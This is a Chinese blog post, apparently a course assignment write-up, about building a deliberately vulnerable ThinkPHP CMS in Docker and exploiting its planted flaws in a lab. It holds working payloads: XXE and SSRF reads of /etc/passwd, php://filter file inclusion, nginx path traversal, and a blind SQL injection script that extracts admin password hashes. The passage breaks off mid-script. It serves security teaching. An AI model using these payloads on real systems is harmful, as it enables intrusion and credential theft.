@@ -1,0 +1,2379 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/feiji.png">
+  <link rel="icon" type="image/png" href="/img/feiji.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sunzy">
+  <meta name="keywords" content="">
+  <title>mycms - 一路走到黑</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/a11y-light.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Sunzy'blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('https://i.loli.net/2020/10/24/eBR35xZYEbuzSW9.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-03-21 15:47" pubdate>
+        2021年3月21日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      18.2k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      243
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">mycms</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
+            <div class="markdown-body" id="post-body">
+              <p>网络安全与攻击实验课程作业</p>
+<span id="more"></span>
+
+<p>[TOC]</p>
+<h1 id="课程要求"><a href="#课程要求" class="headerlink" title="课程要求"></a>课程要求</h1><p>基于 Linux 操作系统（如 Ubuntu），使用 Docker 容器，选择一门自己擅长的语言（只能从 PHP、JAVA、Python 中选择）及其当前流行的开发框架（如 Java 的 Struts2、Spring、Hibernate，Python的 Django、flask，PHP 的 ThinkPHP 等） 开发一个 Web 应用系统。</p>
+<p>具体要求：</p>
+<blockquote>
+<p>1）该系统需内置典型的 Web 漏洞（不少于 10 种，每种可有多个）。必须包含 SQL 注入、XSS、文件上传、文件包含、命令执行、XXE和反序列化。 </p>
+<p>2）基于 Docker 容器发布系统，并完成内置典型漏洞的攻击过程。</p>
+<p>3）将原有漏洞页面进行完善（不能直接在原有漏洞页面修改，需重新创建修复漏洞的页面）以修复所有漏洞，并通过测试证明漏</p>
+<p>洞已经修复。</p>
+</blockquote>
+<h1 id="网站开发"><a href="#网站开发" class="headerlink" title="网站开发"></a>网站开发</h1><h2 id="1-开发工具"><a href="#1-开发工具" class="headerlink" title="1.开发工具"></a>1.开发工具</h2><p>phpstorm+vscode</p>
+<p>phpstorm 重要用于对php代码的代码编写和修改，其提供了十分丰富的功能，帮助开发者快速修改代码，提供代码定位，能够快速的定位到某个函数所属文件，大大提高了工作效率。</p>
+<p>而vscode则负责查看文件内容，其相对于PHP storm比较轻量，占用内存小，速度快。</p>
+<h2 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2.环境搭建"></a>2.环境搭建</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>使用docker以及docker-compose</p>
+<p>具体为mysql 5.6 + nginx +php7.1</p>
+<p>其中docker-compose.yml</p>
+<div class="hljs"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span>
+<span class="hljs-attr">services:</span>
+  <span class="hljs-attr">nginx:</span>
+    <span class="hljs-attr">image:</span> <span class="hljs-string">hub.c.163.com/library/nginx:latest</span>
+  	 <span class="hljs-comment"># 下载镜像的源，这里选择网易的镜像源，可以提高下载的速度， latest是最新版本</span>
+    <span class="hljs-attr">ports:</span> 
+      <span class="hljs-bullet">-</span> <span class="hljs-number">80</span><span class="hljs-string">:80</span>
+     <span class="hljs-comment"># 端口映射</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-number">443</span><span class="hljs-string">:443</span>
+    <span class="hljs-attr">volumes:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginx/nginx.conf:/etc/nginx/nginx.conf</span>
+      <span class="hljs-comment">#nginx的配置文件路径</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./nginx/conf.d:/etc/nginx/conf.d</span>
+     <span class="hljs-comment"># 其他的配置文件</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/var/www</span>
+      <span class="hljs-comment">#目录映射  src作为网站的根目录，网站的所有文件需要放在这里</span>
+  <span class="hljs-attr">php:</span>
+    <span class="hljs-attr">build:</span> <span class="hljs-string">./php</span>
+    <span class="hljs-attr">volumes:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./html:/var/www</span>
+      <span class="hljs-comment">#根目录</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./php/php.ini:/usr/local/etc/php/php.ini</span>
+      <span class="hljs-comment"># php的配置文件</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./php/php-fpm.conf:/usr/local/etc/php-fpm.d/www.conf</span> 
+  <span class="hljs-attr">mysql:</span>
+    <span class="hljs-attr">image:</span> <span class="hljs-string">hub.c.163.com/library/mysql:5.6</span>
+    <span class="hljs-attr">volumes:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/data:/var/lib/mysql</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/my.cnf:/etc/mysql/conf.d/my.cnf</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql/init:/docker-entrypoint-initdb.d/</span>
+      <span class="hljs-comment"># 这里需要初始化一个数据库</span>
+    <span class="hljs-attr">ports:</span> 
+      <span class="hljs-bullet">-</span> <span class="hljs-number">3306</span><span class="hljs-string">:3306</span>
+    <span class="hljs-attr">environment:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_ROOT_PASSWORD=root</span>
+     <span class="hljs-comment"># mysql数据库的密码</span>
+</code></pre></div>
+
+<p>其余配置文件可以根据需要从网上获取。</p>
+<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><p>搭建目的是测试使用，方便重新搭建和数据管理，为再linux上搭建做好准备</p>
+<p>课程要求使用docker搭建运行环境，但是Linux系统是虚拟机搭建的，里面没有好用的phpStrom，所以先在windows上搭建，试试水。</p>
+<p>工具使用phpstduy2018，apache+php7.1</p>
+<ul>
+<li><p>首先在数据库中建立一个数据库，复制cms.sql中的内容在命令行中运行</p>
+</li>
+<li><p>将文件放入www目录下，修改config中的database.php内容，将用户名和密码该对应的内容</p>
+</li>
+<li><p>打开phpstduy,选择 其他菜单选项-&gt;站点域名管理，网站目录选择cms/public，网站名随便起，如<a target="_blank" rel="noopener" href="http://www.mycms.com">www.mycms.com</a></p>
+</li>
+<li><p>打开host文件，添加 <code>127.0.0.1  www.mycms.com</code>，然后访问即可<a target="_blank" rel="noopener" href="http://www.mycms.com/admin进入后台">www.mycms.com/admin进入后台</a></p>
+<p>账号密码都为admin</p>
+</li>
+</ul>
+  <img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210321160739254.png" srcset="/img/loading.gif" style="zoom:50%;">
+
+
+
+
+
+<h2 id="3-开发过程"><a href="#3-开发过程" class="headerlink" title="3.开发过程"></a>3.开发过程</h2><p>开发thinkphp的网站，当然离不开ThinkPHP的手册<code>http://www.shouce.ren/api/view/a/15517</code></p>
+<p>thinkphp中是基于<code>模块\控制器\方法</code>来访问网页的，所以我们必须学会如何创建一个控制器</p>
+<p>在网站的文件下，调出终端使用</p>
+<div class="hljs"><pre><code class="hljs gauss">php think <span class="hljs-built_in">make</span>:controller  模块名\控制器名</code></pre></div>
+
+<p>创建完后便可以在浏览器中输入<code>127.0.0.1\模块名\控制器名</code>，进行访问，当然还要继续完善其中的内容</p>
+<p>以上是开发最基础的部分，也是最重要的部分，所有的漏洞代码基本都需要在自己所创建的控制器中完成的。</p>
+<h2 id="4-网站介绍"><a href="#4-网站介绍" class="headerlink" title="4.网站介绍"></a>4.网站介绍</h2><p>此站点采用的是基于thinkPHP的cms，此cms包含常用于一些公司主页介绍或者个人博客的搭建，是一个功能相对比较齐全的cms，但是随着功能的增多也会暴露出一些问题，所以会存在一些漏洞，加上自己根据课程要求对其进行了魔改，使得该系统包含了十二种漏洞，二十个漏洞点。</p>
+<p>该网站是一家安全公司的主页，但是由于该安全公司刚刚成立不久，网站开发人员安全意识不够高（haha, 纯属虚构），导致该网站中存在了很多漏洞，此时一个不安好心的黑客看上了这家安全公司的网站。对该网站进行了攻击。</p>
+<p>具体功能如下：</p>
+<p>(1).前台展示页面，包含关于我们，新闻中心，联系我们以及意见反馈四个模块</p>
+<p>其中关于我们–&gt;公司主页 位置存在SSRF漏洞</p>
+<p>意见反馈 存在XXE漏洞</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181531579.png" srcset="/img/loading.gif" alt="image-20210408181531579"></p>
+<p>(2).后台管理员页面，后台管理功能十分丰富，几乎包含所有需要的功能，并且可以根据需要自定义模块并安装，其中的短消息发送存在XSS漏洞，查看内网主机和phpinfo存在远程命令执行漏洞，管理会员的页面存在CSRF漏洞</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181705018.png" srcset="/img/loading.gif" alt="image-20210408181705018"></p>
+<p>(3).用户注册与登录，提供用户注册和登录功能，登录后的用户可以根据权限向不同的栏目投稿，向别的用户发送消息，支持头像更换，密码修改等功能。其中投稿位置存在XSS漏洞和文件上传漏洞，密码修改位置存在SQL注入漏洞。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210421223320698.png" srcset="/img/loading.gif" alt="image-20210421223320698"></p>
+<p>(4).在前台页面中有一个单独的模块，叫免试加入，这里存在一个CTF题目，类型时unserialize，如果可以获取flag，则可以获取免试资格加入团队。</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408181601058.png" srcset="/img/loading.gif" alt="image-20210408181601058" style="zoom:67%;">
+
+<h2 id="5-漏洞介绍"><a href="#5-漏洞介绍" class="headerlink" title="5.漏洞介绍"></a>5.漏洞介绍</h2><ul>
+<li><p>本地文件包含</p>
+<p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞，造成这个漏洞的函数有四个<code>include,include_once,require,require_once</code>。该漏洞可以使用php为协议php://filter，读取php文件的源码，在一些ctf题目中很常见。</p>
+<p>该漏洞存在于网站首页的联系我们页面</p>
+</li>
+<li><p>ssrf</p>
+<p>服务器端请求伪造是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统，攻击者可以利用该漏洞对内网进行扫描探测存活的主机和端口，进而对内网进行攻击。此外该漏洞还会造成文件包含，使用file://协议+文件绝对路径可以获取服务器上的文件。</p>
+<p>总结SSRF造成的危害：</p>
+<ul>
+<li><p>扫内网</p>
+</li>
+<li><p>向内部任意主机的任意端口发送精心构造的Payload</p>
+</li>
+<li><p>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）</p>
+</li>
+<li><p>攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等）</p>
+</li>
+<li><p>利用file协议读取本地文件等</p>
+</li>
+</ul>
+<p>此漏洞存在访问公司主页</p>
+</li>
+</ul>
+<ul>
+<li><p>xxe</p>
+<p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，从名字就能看出来，这是一个注入漏洞，注入的是XML外部实体。</p>
+<p>此漏洞可以形成命令执行和文件包含攻击。</p>
+<p>此漏洞存在于意见反馈页面</p>
+</li>
+</ul>
+<ul>
+<li><p>sql注入 — 包含两个漏洞点</p>
+<p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p>
+<p>此漏洞存在与用户修改密码页面和登录修改稿件页面，二者都可以使用盲注进行攻击。</p>
+</li>
+</ul>
+<ul>
+<li><p>文件上传</p>
+<p>网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。</p>
+<p>此漏洞存在于用户上传头像的位置，上传一句话木马后可直接使用蚁剑获取shell</p>
+</li>
+</ul>
+<ul>
+<li><p>弱口令</p>
+<p>弱口令顾名思义是使用了安全性比较低，并且比较常见的短字符作为密码</p>
+<p>此漏洞存在于管理员密码，这是很常见但又很危险的一个漏洞</p>
+</li>
+</ul>
+<ul>
+<li><p>xss       — 包含两个漏洞点</p>
+<p>xss就是攻击者在web页面插入恶意的Script代码，当用户浏览该页之时，嵌入其中web里面的Script代码会被执行，从而达到恶意攻击用户的特殊目的。攻击这可以使用xss获取处于登录状态的用户cookie，从而可以无密码登录账号。</p>
+<p>此漏洞存在两个地方，一个是用户投稿，一个用户发送短消息</p>
+</li>
+</ul>
+<ul>
+<li><p>rce</p>
+<p>是指用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令，可能会允许攻击者通过改变 $PATH 或程序执行环境的其他方面来执行一个恶意构造的代码。</p>
+<p>此漏洞存在于后台管理页面中的信息采集–&gt;查看内网主机</p>
+</li>
+<li><p>任意文件下载</p>
+<p>非法下载服务器上存在的资源</p>
+</li>
+<li><p>csrf</p>
+<p>跨站点请求伪造 ， 跟XSS攻击一样，存在巨大的危害性 。利用csrf，攻击者可以盗用你的身份，以你的名义发送恶意请求。 你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210321220650619.png" srcset="/img/loading.gif" alt="image-20210321220650619" style="zoom:50%;">
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>反序列化  </p>
+<p>不安全的反序列化是指网站对用户可控制的数据进行反序列化时，攻击者能够操纵序列化的对象，以将有害数据传递到应用程序代码中。甚至有可能用完全不同类的对象替换序列化的对象。更夸张的是，将对网站可用的任何类别的对象进行反序列化和实例化，而与预期的类别无关。因此，不安全的反序列化有时称为“对象注入”漏洞</p>
+<p>此漏洞存在免试加入我们的页面，成功者可以获得一个flag。</p>
+</li>
+</ul>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>渗透测试流程</p>
+<p><img src="/2021/03/21/mycms/Users/Sunzh/Desktop/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%AE%9E%E8%B7%B5%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B.png" srcset="/img/loading.gif" alt="网络攻击与防御实践渗透测试流程"></p>
+<h2 id="1-RFI"><a href="#1-RFI" class="headerlink" title="1.RFI"></a>1.RFI</h2><p>首先点击首页的最下面“优秀员工”，可以发现URL的变化，看到最后有一个file参数，猜测该页面的一些参数是从<code>info.php</code>中获取的，那么这个位置就应该是一个本地文件包含。尝试将info.php换成其他的文件名，发现页面中的一些内容消失了，说明这里就是用了文件包含。</p>
+<p>那么如果没有对该参数进行过滤或者其他的限制的话，我们就可以使用<code>php://filter</code>协议读取到php文件的base64源码，</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210401101403284.png" srcset="/img/loading.gif" alt="image-20210401101403284"></p>
+<p>或者直接读取操作系统中的一些敏感文件，如<code>/etc/passwd</code>。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210401101335296.png" srcset="/img/loading.gif" alt="image-20210401101335296"></p>
+<p>可以看到，这里没有对file协议过滤，这样就可以通过一些常用的文件路径获取到敏感文件</p>
+<h2 id="2-XXE"><a href="#2-XXE" class="headerlink" title="2.XXE"></a>2.XXE</h2><p>注入XML文件中，一旦文件被执行，将会读取服务器上的本地文件，并对内网发起访问扫描内部网络端口。换而言之，XXE是一种从本地到达各种服务的方法。此外，在一定程度上这也可能帮助攻击者绕过防火墙规则过滤或身份验证检查。</p>
+<p>xxe漏洞存在于意见反馈页面，使用Bp抓包可以看到，提交的参数是xml格式，提交成功后会返回一个提示信息<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322094353064.png" srcset="/img/loading.gif" alt="image-20210322094353064"></p>
+<p>既然参数是以xml格式提交的，那么我们可以尝试构造出一个外部实体注入其中，造成文件包含或者命令执行。</p>
+<p>使用payload读取<code>/etc/passwd</code>文件</p>
+<div class="hljs"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE a [
+&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
+]&gt;
+&lt;user&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;info&gt;as&lt;&#x2F;info&gt;&lt;&#x2F;user&gt;</code></pre></div>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322095014823.png" srcset="/img/loading.gif" alt="image-20210322095014823"></p>
+<h2 id="3-SSRF"><a href="#3-SSRF" class="headerlink" title="3.SSRF"></a>3.SSRF</h2><p>当访问公司主页这个页面时会发现url发生变化，并跳转到另一页面</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192059989.png" srcset="/img/loading.gif" alt="image-20210322192059989" style="zoom:50%;">
+
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192116225.png" srcset="/img/loading.gif" alt="image-20210322192116225" style="zoom:67%;">
+
+<p>这里是跳转到了我的博客页面，但是可能由于缺少渲染，显示不正常，尝试访问百度，get提交</p>
+<div class="hljs"><pre><code class="hljs awk">?url=https:<span class="hljs-regexp">//</span>www.baidu.com</code></pre></div>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192303582.png" srcset="/img/loading.gif" alt="image-20210322192303582"></p>
+<p>可以发现成功跳转到了百度的页面，猜测我们提交的url参数没有进行过滤就直接带入到函数中执行。</p>
+<p>那么我们可以尝试使用<code>file://</code>协议读取服务器上的文件，使用payload:<code>?url=file:///etc/passwd</code>，成功读取到文件内容，漏洞利用成功。</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322192737122.png" srcset="/img/loading.gif" alt="image-20210322192737122"></p>
+<h2 id="4-目录遍历"><a href="#4-目录遍历" class="headerlink" title="4.目录遍历"></a>4.目录遍历</h2><p>在浏览器中按F12，在network中查看响应头，可以发现存在server字段，这是网站使用的服务器以及版本信息，这里可以看到是nginx</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414192735246.png" srcset="/img/loading.gif" alt="image-20210414192735246" style="zoom:50%;">
+
+<p>而nginx存在一个很常见的漏洞—配置不当导致的目录穿越漏洞</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414193433871.png" srcset="/img/loading.gif" alt="image-20210414193433871" style="zoom:67%;">
+
+
+
+<p>进行攻击</p>
+<p>尝试访问<code>http://192.168.164.147/files/</code>，出现了<code>images</code>文件夹，这应该网站保存上传图片的位置</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414193646247.png" srcset="/img/loading.gif" alt="image-20210414193646247"></p>
+<p>输入<code>http://192.168.164.147/files../</code>看到了网站的根目录中的内容，点击可以将部分文件下载。</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210414194304371.png" srcset="/img/loading.gif" alt="image-20210414194304371" style="zoom: 50%;">
+
+<h2 id="5-SQL注入（4个）"><a href="#5-SQL注入（4个）" class="headerlink" title="5.SQL注入（4个）"></a>5.SQL注入（4个）</h2><h3 id="漏洞点一"><a href="#漏洞点一" class="headerlink" title="漏洞点一"></a>漏洞点一</h3><p>第一个sql注入漏洞点在用户登录页面，存在一个修改密码功能，先注册有一个用户，尝试修改密码，猜测其工作机制。</p>
+<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193046802.png" srcset="/img/loading.gif" alt="image-20210322193046802" style="zoom:67%;">
+
+<p>第一次尝试输入一个不存在的用户名，返回信息是<code>no user!</code></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193527184.png" srcset="/img/loading.gif" alt="image-20210322193527184"></p>
+<p>第二次输入正确的用户名错误的密码，提示<code>wrong password!</code>，这个逻辑很正常</p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193635551.png" srcset="/img/loading.gif" alt="image-20210322193635551"></p>
+<p>第三次输入正确的用户名和密码，而两个不一样的新密码，提示<code>new password are different!</code></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322193733391.png" srcset="/img/loading.gif" alt="image-20210322193733391"></p>
+<p>这上面的三种情况是修改密码时常见的情况，看似都可以正常的工作，但是如果没有对用户名这个参数进行严格的过滤的话就可以造成盲注的漏洞。</p>
+<p>因为当我们提交完参数后，服务器要做的第一件事就是去数据库种查找是否存在该用户名，若不存在则返回<code>no user!</code>，若存在的话且输入的两次新密码都正确但是旧密码错误，就会提示用户<code>wrong password!</code>，这也是造成盲注的重要原因。比如说，我们注册的用户名和密码分别为<code>szy</code>和<code>admin</code>，但是我们提交时构造出如下的语句</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">account</span>=szy&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">1</span>#&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span>
+<span class="hljs-attribute">account</span>=szy&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span>#&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span></code></pre></div>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194605601.png" srcset="/img/loading.gif" alt="image-20210322194605601"></p>
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194635676.png" srcset="/img/loading.gif" alt="image-20210322194635676"></p>
+<p>看到以上的结果我们就可以判断一定存在注入。</p>
+<p>构造payload</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">account</span>=szy&#x27; and ascii(substring(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span> #&amp;password=ad&amp;npassword=<span class="hljs-number">111</span>&amp;newpassword=<span class="hljs-number">111</span></code></pre></div>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210322194849731.png" srcset="/img/loading.gif" alt="image-20210322194849731"></p>
+<p>返回的是<code>wrong password</code>，说明数据库名的第一个字符的ascii码是大于100的，直接使用二分注入，脚本如下</p>
+<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> time
+url = <span class="hljs-string">&quot;http://192.168.164.147:81/change/changepass&quot;</span>
+
+heard = &#123;<span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;http://192.168.164.147:81/change/changepass&quot;</span>&#125;
+flag = <span class="hljs-string">&quot;&quot;</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):
+    left = <span class="hljs-number">32</span>
+    right = <span class="hljs-number">128</span>
+    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
+    <span class="hljs-keyword">while</span>(left &lt; right):
+        <span class="hljs-comment"># time.sleep(1)</span>
+        payload = <span class="hljs-string">&quot;szy&#x27; and ascii(substring(database(),&#123;0&#125;,1))&gt;&#123;1&#125; #&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
+        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(table_name),&#123;0&#125;,1)) as a from information_schema.tables where table_schema=database() having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
+        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(column_name),&#123;0&#125;,1)) as a from information_schema.columns where table_schema=database() and table_name=&#x27;yzn_admin&#x27; having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
+        payload = <span class="hljs-string">&quot;szy&#x27; and (select ascii(substring(group_concat(password),&#123;0&#125;,1)) as a from yzn_admin having a&gt;&#123;1&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
+        data = &#123;<span class="hljs-string">&quot;account&quot;</span>:payload, <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;111a&quot;</span>,<span class="hljs-string">&quot;npassword&quot;</span>:<span class="hljs-string">&quot;222&quot;</span>,<span class="hljs-string">&quot;newpassword&quot;</span>:<span class="hljs-string">&quot;222&quot;</span>&#125;
+        response = requests.post(url=url,data=data,headers=heard)
+        <span class="hljs-comment"># t = response.text</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;wrong password&quot;</span> <span class="hljs-keyword">in</span> response.text:
+            left = mid+<span class="hljs-number">1</span>
+        <span class="hljs-keyword">else</span>:
+            right = mid
